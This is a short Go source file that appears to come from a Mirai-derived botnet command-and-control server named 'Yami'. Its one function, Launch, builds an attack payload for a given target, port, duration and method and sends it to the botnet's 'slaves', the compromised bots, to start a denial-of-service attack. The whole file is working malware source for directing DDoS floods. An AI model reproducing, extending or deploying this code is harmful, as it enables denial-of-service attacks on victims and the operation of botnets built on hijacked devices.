package AttacksV2

import slaves "Yami/core/slaves/mirai"

func Launch(target string, duration int, port int, method *Mirai) error {

	payload, err := build(target, port, duration, method)
	if err != nil {
		return err
	}

	slaves.Send(payload)

	return nil
}